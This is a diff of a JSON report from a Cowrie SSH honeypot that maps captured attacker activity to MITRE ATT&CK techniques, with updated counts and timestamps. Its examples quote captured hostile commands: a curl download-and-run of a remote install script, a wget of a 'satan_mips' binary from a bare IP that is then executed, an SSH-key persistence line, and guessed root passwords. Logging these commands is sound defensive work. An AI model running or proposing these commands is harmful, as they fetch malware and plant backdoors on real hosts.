@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-31 05:01:44",
+  "generated": "2026-08-31 06:03:44",
   "totals": {
-    "commands": 717,
-    "login_failed": 569,
-    "login_success": 190,
-    "sessions": 703
+    "commands": 945,
+    "login_failed": 680,
+    "login_success": 235,
+    "sessions": 869
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 569,
+      "count": 680,
       "examples": [
         "root / root2025@",
         "root / 7ujMko0vizxv",
@@ -21,14 +21,14 @@
         "support / support"
       ],
       "first": "2026-08-31T00:00:13.861123Z",
-      "last": "2026-08-31T05:00:15.514532Z",
-      "unique_ips": 34
+      "last": "2026-08-31T06:03:28.698573Z",
+      "unique_ips": 45
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 190,
+      "count": 235,
       "examples": [
         "enable\\x00 / linuxshell\\x00",
         "root / root",
@@ -37,14 +37,14 @@
         "root / LeitboGi0ro"
       ],
       "first": "2026-08-31T00:01:56.916034Z",
-      "last": "2026-08-31T05:00:16.053941Z",
-      "unique_ips": 20
+      "last": "2026-08-31T06:03:35.111424Z",
+      "unique_ips": 25
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 13,
+      "count": 86,
       "examples": [
         "curl -sL -o /tmp/install.sh https://del.sou.pp.ua/install.sh && bash /tmp/install.sh; rm -f /tmp/install.sh",
         "https://del.sou.pp.ua/install.sh",
@@ -53,14 +53,30 @@
         "if ! command -v curl &> /dev/null; then apt-get update -y && apt-get install -y curl || yum install -y curl; fi"
       ],
       "first": "2026-08-31T01:14:34.428694Z",
-      "last": "2026-08-31T04:53:07.053230Z",
-      "unique_ips": 3
+      "last": "2026-08-31T06:01:26.686695Z",
+      "unique_ips": 5
+    },
+    {
+      "id": "T1222.002",
+      "name": "File and Directory Permissions Modification: Linux and Mac",
+      "tactic": "Defense Evasion",
+      "count": 70,
+      "examples": [
+        "mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQGOxKK322AbGwPqefUy1MUBZ",
+        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
+        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
+        "#!/bin/bash\nulimit -n 1024 2>/dev/null || true\ncp /bin/busybox /tmp/ || cp /bin/busybox /var/tmp/ || cp /bin/busybox /va",
+        "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://176.65.139.136/satan_mips; chmod 777 satan_mips; ./sa"
+      ],
+      "first": "2026-08-31T01:14:33.449575Z",
+      "last": "2026-08-31T05:48:58.494080Z",
+      "unique_ips": 4
     },
     {
       "id": "T1082",
       "name": "System Information Discovery",
       "tactic": "Discovery",
-      "count": 6,
+      "count": 7,
       "examples": [
         "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
         "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
@@ -69,23 +85,8 @@
         "uname -a"
       ],
       "first": "2026-08-31T01:14:37.600310Z",
-      "last": "2026-08-31T04:10:10.587800Z",
-      "unique_ips": 5
-    },
-    {
-      "id": "T1222.002",
-      "name": "File and Directory Permissions Modification: Linux and Mac",
-      "tactic": "Defense Evasion",
-      "count": 4,
-      "examples": [
-        "mkdir -p ~/.ssh; chattr -ia ~/.ssh/authorized_keys; echo \"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHQGOxKK322AbGwPqefUy1MUBZ",
-        "#!/bin/bash\nset -e\n\n# ==========================================\n# 1. \u57fa\u7840\u914d\u7f6e\u533a (\u9690\u853d\u4f2a\u88c5\u65b9\u6848)\n# =================================",
-        "export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH\nuname=$(uname -s -v -n -m 2>/dev/null || ",
-        "#!/bin/bash\nulimit -n 1024 2>/dev/null || true\ncp /bin/busybox /tmp/ || cp /bin/busybox /var/tmp/ || cp /bin/busybox /va"
-      ],
-      "first": "2026-08-31T01:14:33.449575Z",
-      "last": "2026-08-31T04:52:56.614135Z",
-      "unique_ips": 3
+      "last": "2026-08-31T05:41:57.194410Z",
+      "unique_ips": 6
     },
     {
       "id": "T1059.004",
@@ -176,19 +177,31 @@
   "unmapped": [
     [
       "system",
-      172
+      208
     ],
     [
       "shell",
-      171
+      207
     ],
     [
       "sh",
-      171
+      207
     ],
     [
       "/bin/busybox UNSTABLE",
-      170
+      205
+    ],
+    [
+      "RPMA",
+      6
+    ],
+    [
+      "AMOO",
+      6
+    ],
+    [
+      "enable",
+      2
     ],
     [
       "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
@@ -197,10 +210,6 @@
     [
       "cd /proc && cat self/cmdline",
       2
-    ],
-    [
-      "enable",
-      1
     ],
     [
       "linuxshell",
@@ -244,14 +253,6 @@
     ],
     [
       "echo SHELL_TEST",
-      1
-    ],
-    [
-      "/bin/busybox TEST",
-      1
-    ],
-    [
-      "cat /proc",
       1
     ]
   ]
